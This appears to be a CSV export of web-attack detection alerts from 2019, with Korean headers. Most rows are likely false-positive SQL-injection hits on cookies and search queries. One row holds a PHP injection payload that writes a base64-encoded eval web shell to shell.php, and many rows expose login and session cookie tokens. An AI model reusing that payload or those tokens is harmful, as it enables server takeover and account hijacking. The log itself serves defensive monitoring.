장비발생시간,출발지IP,목적지IP,목적지포트,공격명,raw_data
2019-02-03 21:47,218.148.103.25,139.150.87.138,80,SQL Injection," %22%22%2C1549198073%2C%22http%3A%2F%2Ficarus.game.naver.com%2F%22%5D; _pk_ses.19.b56a=*; warnignCheckTime=1549198081559; tracking=""&SID=1258101320&Count=11&Code=0""; PN_LOGIN=OrTWJyUcpYPXraKtYJ7Wlm8fJSqC6KyhA_TP8qZNrZEkvAxVaBda-yRUzl0Y9uKM_0bzMNQhVPfUqpjh94LUxpTURlLMP2yg33QCXofrapAruRvDJGS9Yl9qpR39GHDHCVxpDZH0QqrMEp0RapPnKglrYItt4PoBvkCtAymIrcxPg0iqyaVr3PdUV32kEVrgU5K_xBWMvnTlCtukLv902w==; GDP_LOGIN=--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=; NV_LOGIN=""--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=""; PN_PUB=P_ICARUS|A|RoaRe4J0a8ZfKwzQROKWc5nv23ECID7mB6WpEH-HHI3JAVpH00lGgcOnhLebNJVFeG4m6TRA3Q47AgC9m6RQ0R2PupQA5CHrOIl0RjDfuRY9OXySu8B9g5AL6OlRG6D84Lv059uLPAChp6PD1ohFQ1ExD7He9IfCnuPPZAp6URe2hoAvPTobIwNR2LDYIApa3mP1xEImXKfL9pfRZkCpOP8m3J-Fg-Q2dUmM82g8I1SfO71U5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|OQW6ZjU01OYCRmuAo6MOKAGG8uhAQSCmw2ucE1PRXSV9HUZLSB2O3I5BsCOVGXh4oDLpBLv9Q3JQ3-HWsRoLU1m8oXDn4L2DMYJKJ3SpJM08TIrCunCpeE86HGHTHgBelN8uIBvEYlOWLNxj8HHLmDCpALfHTYoSOM0vjFJK6Pa90N4h0Mu"
2019-02-03 21:47,218.148.103.25,139.150.87.138,80,SQL Injection," %22%22%2C1549198073%2C%22http%3A%2F%2Ficarus.game.naver.com%2F%22%5D; _pk_ses.19.b56a=*; warnignCheckTime=1549198081559; tracking=""&SID=1258101320&Count=12&Code=0""; PN_LOGIN=OrTWJyUcpYPXraKtYJ7Wlm8fJSqC6KyhA_TP8qZNrZEkvAxVaBda-yRUzl0Y9uKM_0bzMNQhVPfUqpjh94LUxpTURlLMP2yg33QCXofrapAruRvDJGS9Yl9qpR39GHDHCVxpDZH0QqrMEp0RapPnKglrYItt4PoBvkCtAymIrcxPg0iqyaVr3PdUV32kEVrgU5K_xBWMvnTlCtukLv902w==; GDP_LOGIN=--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=; NV_LOGIN=""--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=""; PN_PUB=P_ICARUS|A|RoaRe4J0a8ZfKwzQROKWc5nv23ECID7mB6WpEH-HHI3JAVpH00lGgcOnhLebNJVFeG4m6TRA3Q47AgC9m6RQ0R2PupQA5CHrOIl0RjDfuRY9OXySu8B9g5AL6OlRG6D84Lv059uLPAChp6PD1ohFQ1ExD7He9IfCnuPPZAp6URe2hoAvPTobIwNR2LDYIApa3mP1xEImXKfL9pfRZkCpOP8m3J-Fg-Q2dUmM82g8I1SfO71U5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|OQW6ZjU01OYCRmuAo6MOKAGG8uhAQSCmw2ucE1PRXSV9HUZLSB2O3I5BsCOVGXh4oDLpBLv9Q3JQ3-HWsRoLU1m8oXDn4L2DMYJKJ3SpJM08TIrCunCpeE86HGHTHgBelN8uIBvEYlOWLNxj8HHLmDCpALfHTYoSOM0vjFJK6Pa90N4h0Mu"
2019-02-03 21:48,218.148.103.25,139.150.87.138,80,SQL Injection," %22%22%2C1549198073%2C%22http%3A%2F%2Ficarus.game.naver.com%2F%22%5D; _pk_ses.19.b56a=*; warnignCheckTime=1549198081559; tracking=""&SID=1258101320&Count=13&Code=0""; PN_LOGIN=OrTWJyUcpYPXraKtYJ7Wlm8fJSqC6KyhA_TP8qZNrZEkvAxVaBda-yRUzl0Y9uKM_0bzMNQhVPfUqpjh94LUxpTURlLMP2yg33QCXofrapAruRvDJGS9Yl9qpR39GHDHCVxpDZH0QqrMEp0RapPnKglrYItt4PoBvkCtAymIrcxPg0iqyaVr3PdUV32kEVrgU5K_xBWMvnTlCtukLv902w==; GDP_LOGIN=--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=; NV_LOGIN=""--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=""; PN_PUB=P_ICARUS|A|RoaRe4J0a8ZfKwzQROKWc5nv23ECID7mB6WpEH-HHI3JAVpH00lGgcOnhLebNJVFeG4m6TRA3Q47AgC9m6RQ0R2PupQA5CHrOIl0RjDfuRY9OXySu8B9g5AL6OlRG6D84Lv059uLPAChp6PD1ohFQ1ExD7He9IfCnuPPZAp6URe2hoAvPTobIwNR2LDYIApa3mP1xEImXKfL9pfRZkCpOP8m3J-Fg-Q2dUmM82g8I1SfO71U5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|OQW6ZjU01OYCRmuAo6MOKAGG8uhAQSCmw2ucE1PRXSV9HUZLSB2O3I5BsCOVGXh4oDLpBLv9Q3JQ3-HWsRoLU1m8oXDn4L2DMYJKJ3SpJM08TIrCunCpeE86HGHTHgBelN8uIBvEYlOWLNxj8HHLmDCpALfHTYoSOM0vjFJK6Pa90N4h0Mu"
2019-02-03 21:48,218.148.103.25,139.150.87.138,80,SQL Injection," %22%22%2C1549198073%2C%22http%3A%2F%2Ficarus.game.naver.com%2F%22%5D; _pk_ses.19.b56a=*; warnignCheckTime=1549198081559; tracking=""&SID=1258101320&Count=14&Code=0""; PN_LOGIN=OrTWJyUcpYPXraKtYJ7Wlm8fJSqC6KyhA_TP8qZNrZEkvAxVaBda-yRUzl0Y9uKM_0bzMNQhVPfUqpjh94LUxpTURlLMP2yg33QCXofrapAruRvDJGS9Yl9qpR39GHDHCVxpDZH0QqrMEp0RapPnKglrYItt4PoBvkCtAymIrcxPg0iqyaVr3PdUV32kEVrgU5K_xBWMvnTlCtukLv902w==; GDP_LOGIN=--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=; NV_LOGIN=""--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=""; PN_PUB=P_ICARUS|A|RoaRe4J0a8ZfKwzQROKWc5nv23ECID7mB6WpEH-HHI3JAVpH00lGgcOnhLebNJVFeG4m6TRA3Q47AgC9m6RQ0R2PupQA5CHrOIl0RjDfuRY9OXySu8B9g5AL6OlRG6D84Lv059uLPAChp6PD1ohFQ1ExD7He9IfCnuPPZAp6URe2hoAvPTobIwNR2LDYIApa3mP1xEImXKfL9pfRZkCpOP8m3J-Fg-Q2dUmM82g8I1SfO71U5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|OQW6ZjU01OYCRmuAo6MOKAGG8uhAQSCmw2ucE1PRXSV9HUZLSB2O3I5BsCOVGXh4oDLpBLv9Q3JQ3-HWsRoLU1m8oXDn4L2DMYJKJ3SpJM08TIrCunCpeE86HGHTHgBelN8uIBvEYlOWLNxj8HHLmDCpALfHTYoSOM0vjFJK6Pa90N4h0Mu"
2019-02-03 21:48,218.148.103.25,139.150.87.138,80,SQL Injection," %22%22%2C1549198073%2C%22http%3A%2F%2Ficarus.game.naver.com%2F%22%5D; _pk_ses.19.b56a=*; warnignCheckTime=1549198081559; tracking=""&SID=1258101320&Count=15&Code=0""; PN_LOGIN=OrTWJyUcpYPXraKtYJ7Wlm8fJSqC6KyhA_TP8qZNrZEkvAxVaBda-yRUzl0Y9uKM_0bzMNQhVPfUqpjh94LUxpTURlLMP2yg33QCXofrapAruRvDJGS9Yl9qpR39GHDHCVxpDZH0QqrMEp0RapPnKglrYItt4PoBvkCtAymIrcxPg0iqyaVr3PdUV32kEVrgU5K_xBWMvnTlCtukLv902w==; GDP_LOGIN=--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=; NV_LOGIN=""--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=""; PN_PUB=P_ICARUS|A|RoaRe4J0a8ZfKwzQROKWc5nv23ECID7mB6WpEH-HHI3JAVpH00lGgcOnhLebNJVFeG4m6TRA3Q47AgC9m6RQ0R2PupQA5CHrOIl0RjDfuRY9OXySu8B9g5AL6OlRG6D84Lv059uLPAChp6PD1ohFQ1ExD7He9IfCnuPPZAp6URe2hoAvPTobIwNR2LDYIApa3mP1xEImXKfL9pfRZkCpOP8m3J-Fg-Q2dUmM82g8I1SfO71U5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|OQW6ZjU01OYCRmuAo6MOKAGG8uhAQSCmw2ucE1PRXSV9HUZLSB2O3I5BsCOVGXh4oDLpBLv9Q3JQ3-HWsRoLU1m8oXDn4L2DMYJKJ3SpJM08TIrCunCpeE86HGHTHgBelN8uIBvEYlOWLNxj8HHLmDCpALfHTYoSOM0vjFJK6Pa90N4h0Mu"
2019-02-03 21:48,218.148.103.25,139.150.87.138,80,SQL Injection," %22%22%2C1549198073%2C%22http%3A%2F%2Ficarus.game.naver.com%2F%22%5D; _pk_ses.19.b56a=*; warnignCheckTime=1549198081559; tracking=""&SID=1258101320&Count=16&Code=0""; PN_LOGIN=OrTWJyUcpYPXraKtYJ7Wlm8fJSqC6KyhA_TP8qZNrZEkvAxVaBda-yRUzl0Y9uKM_0bzMNQhVPfUqpjh94LUxpTURlLMP2yg33QCXofrapAruRvDJGS9Yl9qpR39GHDHCVxpDZH0QqrMEp0RapPnKglrYItt4PoBvkCtAymIrcxPg0iqyaVr3PdUV32kEVrgU5K_xBWMvnTlCtukLv902w==; GDP_LOGIN=--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=; NV_LOGIN=""--Ed17LoAE605MZ6zYkPxXFRo-vFH_UP9g9bZEkEuRXyCkTwQsrgHSvdK2HV8fu78uRxo7POJSqpQY1jCJVDpDlyjqWsx6IuQ3e4PcgSPtA=""; PN_PUB=P_ICARUS|A|RoaRe4J0a8ZfKwzQROKWc5nv23ECID7mB6WpEH-HHI3JAVpH00lGgcOnhLebNJVFeG4m6TRA3Q47AgC9m6RQ0R2PupQA5CHrOIl0RjDfuRY9OXySu8B9g5AL6OlRG6D84Lv059uLPAChp6PD1ohFQ1ExD7He9IfCnuPPZAp6URe2hoAvPTobIwNR2LDYIApa3mP1xEImXKfL9pfRZkCpOP8m3J-Fg-Q2dUmM82g8I1SfO71U5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|OQW6ZjU01OYCRmuAo6MOKAGG8uhAQSCmw2ucE1PRXSV9HUZLSB2O3I5BsCOVGXh4oDLpBLv9Q3JQ3-HWsRoLU1m8oXDn4L2DMYJKJ3SpJM08TIrCunCpeE86HGHTHgBelN8uIBvEYlOWLNxj8HHLmDCpALfHTYoSOM0vjFJK6Pa90N4h0Mu"
2019-02-01 10:12,118.24.16.231,112.175.173.70,80,SqlInjection," /crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}"
2019-02-10 21:35,131.107.174.64,218.153.6.101,80,SqlInjection, /osen/getSearchData?searchMode=D&size=15&offset=0&isNotPhoto=Y&keyword=Filepuma%20(%40filepuma)%20%7C%20Twitter
2019-02-04 1:09,40.76.39.227,211.169.240.96,80,SqlInjection, /search.php?kw=Punchbowl.com+%28%40Punchbowl%29+%7C+Twitter&mode=&directGoKeyword=&directGoUrl=
2019-02-09 16:43,131.107.174.159,218.153.6.78,80,SqlInjection, /search?keyword=BOQ+%28%40BOQ%29+%7C+Twitter
2019-02-10 21:42,103.105.156.93,218.153.6.78,80,SqlInjection, /search?keyword=Filepuma+%28%40filepuma%29+%7C+Twitter
2019-02-09 14:35,131.107.174.159,218.153.6.78,80,SqlInjection, /search?keyword=Humana+%28%40Humana%29+%7C+Twitter
2019-02-14 13:30,40.121.33.152,218.153.6.78,80,SqlInjection, /search?keyword=sdna.gr+%28%40Sdna_gr%29+%7C+Twitter
2019-02-03 17:22,131.107.147.143,218.153.6.78,80,SqlInjection, /search?keyword=Tesco+%28%40Tesco%29+%7C+Twitter
2019-02-15 8:24,40.114.79.1,218.153.6.78,80,SqlInjection, /search?keyword=Voya+%28%40Voya%29+%7C+Twitter
2019-02-05 6:22,45.76.211.0,211.191.174.8,443,SqlInjection, 2banner%22%2C%22cct%22%3A%22IB%22%7D; appier_random_unique_id_pEFaFSOvUNuZ3T1=pJLsA8skxA4KOjRemWeCQ1; _a1_f=6acf94aa-886c-46a7-a5f7-1bbfcb19d143; ukc^uplus.co.kr=154823355473980425; appier_tp=1; cto_lwid=b3c1a346-998b-40b0-b890-38c341d2cdba; rtkw^others^eduwill$nate^27372995=27372995^www.rverscorner.com^N^1547914530990; appier_random_unique_id_Q4cVLwSFG7uySJ1=nd9PKGBukOPT_EemZwx_76; ctkw^others^eduwill$nate=^27308564^27372995; appier_is_LCCV=true; cto_idcpy=d673c5f7-a3f4-4830-afbc-ee2ab17fedd9; appier_track_3=_atrk_bi%253DnvPa0Zu5AwCW_yKLc-FOXA%2526_atrk_c%253D_UvoI8DuQEWmY2BDrhmVAg%2526_atrk_cr%253DizZjoskxQZ2ftMHhCbIc5Q%2526_atrk_f%253DpXbY8Yx7TR69ft65h4Rxmgs9fYx67sdldEElPGgqB6AOgpfLUFYx8tYAHed9NhC86D7aCAeYvWQQ-kL-tmBvB--gHWj0cA85XJn0gqJPUZDWLxfy1ViTRidZMQ5mV3WycRfrCQndhmogI9BEPIlDnMhFIU2QgZ9kRUjzusH-NqoIXGj4012U31JOxfmFtGLMebkHeXun2vMN1wGym88r3DSoK-Y6hddzKhIDBOObS4nXsR-jEq6DPMBNOnRtF7AHa4CJi_MQ2yUzWXvm426AYRLqHt5LRpxmPXBP7kClApb7btCfJbc-9nC6jp6%2526_atrk_pt%253D0ZLi1U8SRc87eZmZ; cto_tld_test=woot; ukc^eduwill.net=154791453099070424; rtkw^others^smartuplus$nate^27322192=27322192^www.liveworkdream.com^N^1548233554739 
2019-02-16 18:20,58.229.209.233,139.150.87.138,80,SQL Injection," 5A0E4D5148ECA5DFE3BC08; HPRC1=UhaSuPEo98GsM3DCRTPII6wv; pcBanner=done; _pk_ses.19.b56a=*; _ga=GA1.3.1971192188.1512301279; tracking=""&SID=234709325&Count=3&Code=0""; PN_LOGIN=6DF_4f9NubC1GNwnlnM9eJu2NxKxmQnRJUvFiRURZiBl8V0jxU58ju551k1fGhh_2wcGMSt45Y2yK_25MM-8Mcyn1M3epsU9DKqj4_hHeSVZ-PDflevEz6NvoiSFRmbVUoIAeE94ofj7DaEE_t9r-t76uV2ONBWIqmDRR4g3naxWNsjy678uXE__6ozafO-nS3kS_IxmX1_kX_8i_dX-kg==; GDP_LOGIN=--vi6vO5s5nKI8L-vG_X0VOjbRzmnCvUgjHCV833o6ecGs7hlYAD39F3CxpiQVFqzDW7xnxVxE0rsgCn9L-iavUXfdsB62MSksgYD3kdebE=; NV_LOGIN=""--vi6vO5s5nKI8L-vG_X0VOjbRzmnCvUgjHCV833o6ecGs7hlYAD39F3CxpiQVFqzDW7xnxVxE0rsgCn9L-iavUXfdsB62MSksgYD3kdebE=""; PN_PUB=P_ICARUS|A|4892YhGeCGhuAGy0Ya7BBC04DwCQ352YDHWI6fiAJtKmZGW9MBiDn83Op7oDNJG1wUDHqHnr8285H13w4AA4AhrMG7E9hMWi0h4P8KSR1KHT6Wt1BgVA8EPi6OlRG6D84Lv059uLPAChp6PD5Oc8BvDu3MY40Gc2fD5Yu2vhEpl0Hc3Q5CXq2X-Gn791mT122GBLn_MPbTwV0OnMYKSwvLXDR3kFmVShF6fp9WID2pN1iSnq5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|CYcEetJB_Kuh1g8NwLC0R5BBVeaVARHX12nkTBPFQYD3-43L2hVIYR7w-4I8HPm6oY4BSNIWAmL1PNA3G6xYQmKCZRQmgUgnMHEMvx7PsMYD4xpB2-4W52Jh"
2019-02-16 18:20,58.229.209.233,139.150.87.138,80,SQL Injection," 5A0E4D5148ECA5DFE3BC08; HPRC1=UhaSuPEo98GsM3DCRTPII6wv; pcBanner=done; _pk_ses.19.b56a=*; _ga=GA1.3.1971192188.1512301279; tracking=""&SID=234709325&Count=4&Code=0""; PN_LOGIN=6DF_4f9NubC1GNwnlnM9eJu2NxKxmQnRJUvFiRURZiBl8V0jxU58ju551k1fGhh_2wcGMSt45Y2yK_25MM-8Mcyn1M3epsU9DKqj4_hHeSVZ-PDflevEz6NvoiSFRmbVUoIAeE94ofj7DaEE_t9r-t76uV2ONBWIqmDRR4g3naxWNsjy678uXE__6ozafO-nS3kS_IxmX1_kX_8i_dX-kg==; GDP_LOGIN=--vi6vO5s5nKI8L-vG_X0VOjbRzmnCvUgjHCV833o6ecGs7hlYAD39F3CxpiQVFqzDW7xnxVxE0rsgCn9L-iavUXfdsB62MSksgYD3kdebE=; NV_LOGIN=""--vi6vO5s5nKI8L-vG_X0VOjbRzmnCvUgjHCV833o6ecGs7hlYAD39F3CxpiQVFqzDW7xnxVxE0rsgCn9L-iavUXfdsB62MSksgYD3kdebE=""; PN_PUB=P_ICARUS|A|4892YhGeCGhuAGy0Ya7BBC04DwCQ352YDHWI6fiAJtKmZGW9MBiDn83Op7oDNJG1wUDHqHnr8285H13w4AA4AhrMG7E9hMWi0h4P8KSR1KHT6Wt1BgVA8EPi6OlRG6D84Lv059uLPAChp6PD5Oc8BvDu3MY40Gc2fD5Yu2vhEpl0Hc3Q5CXq2X-Gn791mT122GBLn_MPbTwV0OnMYKSwvLXDR3kFmVShF6fp9WID2pN1iSnq5oqPulOpyQR-4IqDxyMfuLWJIA1BPHJhEDuRRpF4nVKGnSeZ9JV1mPThFQHtSPx0XOVRj6JR|CYcEetJB_Kuh1g8NwLC0R5BBVeaVARHX12nkTBPFQYD3-43L2hVIYR7w-4I8HPm6oY4BSNIWAmL1PNA3G6xYQmKCZRQmgUgnMHEMvx7PsMYD4xpB2-4W52Jh"
2019-02-03 21:13,211.178.79.34,139.150.87.138,80,SQL Injection," 6mZKEIso5LMRLmfEDRjw0UWOJRIKM/vIDz1Oe5Zp7pWoGOmBVfzdh3Ks05cHmsWRahOhaEj5CY7HILrLyBO97VClyngLPsphKIrSAMh5CJUxvkUqTzpASI1qaGuiuFTLs+ITwnKou5jr256PFcF3VtLhGnp4+FkugNI0KKFKv/i9xmBgb9lLsY5tg==; PN_LOGIN=nUCQae7FVlapcS12WhaSagL4V217xHCREVSuIlXvmDOge5TuZwEwLiPNtZFP4WkaaEChdjENygaOR0wXtzCfJ4UiYW0aqC6k5SHZGY7k3aGlwCm8Q0MD9N-zRHXqiDCnPN2llflOcaaYPJG7L2kWdBZrfHJDoGgzCJqzhNoFkKp-34txbevkh-LryapBRxTf; GDP_LOGIN=--aUtrLU0aPBkOYM4FkeNSPeMT0MMJQG-kXHq1CeG3hOt7j_6kJDu20M1BRfup5k6CRIfU_LfImXZZ6fV0kRR62p4oPIfBwmQxjD8qVdwZA=; NV_LOGIN=""--aUtrLU0aPBkOYM4FkeNSPeMT0MMJQG-kXHq1CeG3hOt7j_6kJDu20M1BRfup5k6CRIfU_LfImXZZ6fV0kRR62p4oPIfBwmQxjD8qVdwZA=""; PN_PUB=P_ICARUS|A|3Y-EXE3HpShg2In2unF86O1RROu52rEnWG0ANwXRmFDYc3wG628UBHQ82RZ_3ZvFAxEnnTgNIGn0wqFBMEHu4uk0G2Ohp0ReSfaOeIPGw2PT9wxTxw51Z2pTKv48vkI2m59fShC8v1UZhAoYNmqNvYOhxQhYRQCDPHNp2MOiBh3QYBGACGJjL9tFZwB1TMRq8Wq43SNOH83xSf91po6QsSQA4WiJIWIHmFuBTOVUoB7ZY8H2C0z8ObAJp8neU0i4vjS2X2AXMOL1ftKviSeIMWFFu19uZ9HGI2vJmw5fFKm9LRO8xERAjEmq|O3l1J0U3rLOSEZPLAz2nM5PjPwLDYXAwGO39G1qBJb4OOJBpAv20PoNPA4uX58aSvOSJiKJd2pT6mGE8XSeq00L2fbERYLmw6vgBv5K9ZOW7FXhGOs1me09u; currentCookieTime=1549195980623; _pk_id.19.b56a=6e588dc64"
2019-02-03 21:13,211.178.79.34,139.150.87.138,80,SQL Injection," 6mZKEIso5LMRLmfEDRjw0UWOJRIKM/vIDz1Oe5Zp7pWoGOmBVfzdh3Ks05cHmsWRahOhaEj5CY7HILrLyBO97VClyngLPsphKIrSAMh5CJUxvkUqTzpASI1qaGuiuFTLs+ITwnKou5jr256PFcF3VtLhGnp4+FkugNI0KKFKv/i9xmBgb9lLsY5tg==; PN_LOGIN=nUCQae7FVlapcS12WhaSagL4V217xHCREVSuIlXvmDOge5TuZwEwLiPNtZFP4WkaaEChdjENygaOR0wXtzCfJ4UiYW0aqC6k5SHZGY7k3aGlwCm8Q0MD9N-zRHXqiDCnPN2llflOcaaYPJG7L2kWdBZrfHJDoGgzCJqzhNoFkKp-34txbevkh-LryapBRxTf; GDP_LOGIN=--aUtrLU0aPBkOYM4FkeNSPeMT0MMJQG-kXHq1CeG3hOt7j_6kJDu20M1BRfup5k6CRIfU_LfImXZZ6fV0kRR62p4oPIfBwmQxjD8qVdwZA=; NV_LOGIN=""--aUtrLU0aPBkOYM4FkeNSPeMT0MMJQG-kXHq1CeG3hOt7j_6kJDu20M1BRfup5k6CRIfU_LfImXZZ6fV0kRR62p4oPIfBwmQxjD8qVdwZA=""; PN_PUB=P_ICARUS|A|3Y-EXE3HpShg2In2unF86O1RROu52rEnWG0ANwXRmFDYc3wG628UBHQ82RZ_3ZvFAxEnnTgNIGn0wqFBMEHu4uk0G2Ohp0ReSfaOeIPGw2PT9wxTxw51Z2pTKv48vkI2m59fShC8v1UZhAoYNmqNvYOhxQhYRQCDPHNp2MOiBh3QYBGACGJjL9tFZwB1TMRq8Wq43SNOH83xSf91po6QsSQA4WiJIWIHmFuBTOVUoB7ZY8H2C0z8ObAJp8neU0i4vjS2X2AXMOL1ftKviSeIMWFFu19uZ9HGI2vJmw5fFKm9LRO8xERAjEmq|O3l1J0U3rLOSEZPLAz2nM5PjPwLDYXAwGO39G1qBJb4OOJBpAv20PoNPA4uX58aSvOSJiKJd2pT6mGE8XSeq00L2fbERYLmw6vgBv5K9ZOW7FXhGOs1me09u; JSESSIONID=06534E86B28F90906DD85106A76EF569; currentCooki"
2019-02-03 21:13,211.178.79.34,139.150.87.138,80,SQL Injection," 6mZKEIso5LMRLmfEDRjw0UWOJRIKM/vIDz1Oe5Zp7pWoGOmBVfzdh3Ks05cHmsWRahOhaEj5CY7HILrLyBO97VClyngLPsphKIrSAMh5CJUxvkUqTzpASI1qaGuiuFTLs+ITwnKou5jr256PFcF3VtLhGnp4+FkugNI0KKFKv/i9xmBgb9lLsY5tg==; PN_LOGIN=nUCQae7FVlapcS12WhaSagL4V217xHCREVSuIlXvmDOge5TuZwEwLiPNtZFP4WkaaEChdjENygaOR0wXtzCfJ4UiYW0aqC6k5SHZGY7k3aGlwCm8Q0MD9N-zRHXqiDCnPN2llflOcaaYPJG7L2kWdBZrfHJDoGgzCJqzhNoFkKp-34txbevkh-LryapBRxTf; GDP_LOGIN=--aUtrLU0aPBkOYM4FkeNSPeMT0MMJQG-kXHq1CeG3hOt7j_6kJDu20M1BRfup5k6CRIfU_LfImXZZ6fV0kRR62p4oPIfBwmQxjD8qVdwZA=; NV_LOGIN=""--aUtrLU0aPBkOYM4FkeNSPeMT0MMJQG-kXHq1CeG3hOt7j_6kJDu20M1BRfup5k6CRIfU_LfImXZZ6fV0kRR62p4oPIfBwmQxjD8qVdwZA=""; PN_PUB=P_ICARUS|A|3Y-EXE3HpShg2In2unF86O1RROu52rEnWG0ANwXRmFDYc3wG628UBHQ82RZ_3ZvFAxEnnTgNIGn0wqFBMEHu4uk0G2Ohp0ReSfaOeIPGw2PT9wxTxw51Z2pTKv48vkI2m59fShC8v1UZhAoYNmqNvYOhxQhYRQCDPHNp2MOiBh3QYBGACGJjL9tFZwB1TMRq8Wq43SNOH83xSf91po6QsSQA4WiJIWIHmFuBTOVUoB7ZY8H2C0z8ObAJp8neU0i4vjS2X2AXMOL1ftKviSeIMWFFu19uZ9HGI2vJmw5fFKm9LRO8xERAjEmq|O3l1J0U3rLOSEZPLAz2nM5PjPwLDYXAwGO39G1qBJb4OOJBpAv20PoNPA4uX58aSvOSJiKJd2pT6mGE8XSeq00L2fbERYLmw6vgBv5K9ZOW7FXhGOs1me09u; tracking=""&SID=828479045&Count=3&Code=0""; JSESSIONID=0653"
2019-02-03 21:13,211.178.79.34,139.150.87.189,80,SQL Injection," 6mZKEIso5LMRLmfEDRjw0UWOJRIKM/vIDz1Oe5Zp7pWoGOmBVfzdh3Ks05cHmsWRahOhaEj5CY7HILrLyBO97VClyngLPsphKIrSAMh5CJUxvkUqTzpASI1qaGuiuFTLs+ITwnKou5jr256PFcF3VtLhGnp4+FkugNI0KKFKv/i9xmBgb9lLsY5tg==; PN_LOGIN=nUCQae7FVlapcS12WhaSagL4V217xHCREVSuIlXvmDOge5TuZwEwLiPNtZFP4WkaaEChdjENygaOR0wXtzCfJ4UiYW0aqC6k5SHZGY7k3aGlwCm8Q0MD9N-zRHXqiDCnPN2llflOcaaYPJG7L2kWdBZrfHJDoGgzCJqzhNoFkKp-34txbevkh-LryapBRxTf; GDP_LOGIN=--aUtrLU0aPBkOYM4FkeNSPeMT0MMJQG-kXHq1CeG3hOt7j_6kJDu20M1BRfup5k6CRIfU_LfImXZZ6fV0kRR62p4oPIfBwmQxjD8qVdwZA=; NV_LOGIN=""--aUtrLU0aPBkOYM4FkeNSPeMT0MMJQG-kXHq1CeG3hOt7j_6kJDu20M1BRfup5k6CRIfU_LfImXZZ6fV0kRR62p4oPIfBwmQxjD8qVdwZA=""; PN_PUB=P_ICARUS|A|3Y-EXE3HpShg2In2unF86O1RROu52rEnWG0ANwXRmFDYc3wG628UBHQ82RZ_3ZvFAxEnnTgNIGn0wqFBMEHu4uk0G2Ohp0ReSfaOeIPGw2PT9wxTxw51Z2pTKv48vkI2m59fShC8v1UZhAoYNmqNvYOhxQhYRQCDPHNp2MOiBh3QYBGACGJjL9tFZwB1TMRq8Wq43SNOH83xSf91po6QsSQA4WiJIWIHmFuBTOVUoB7ZY8H2C0z8ObAJp8neU0i4vjS2X2AXMOL1ftKviSeIMWFFu19uZ9HGI2vJmw5fFKm9LRO8xERAjEmq|O3l1J0U3rLOSEZPLAz2nM5PjPwLDYXAwGO39G1qBJb4OOJBpAv20PoNPA4uX58aSvOSJiKJd2pT6mGE8XSeq00L2fbERYLmw6vgBv5K9ZOW7FXhGOs1me09u; tracking=""&SID=828479045&Count=5&Code=0"""
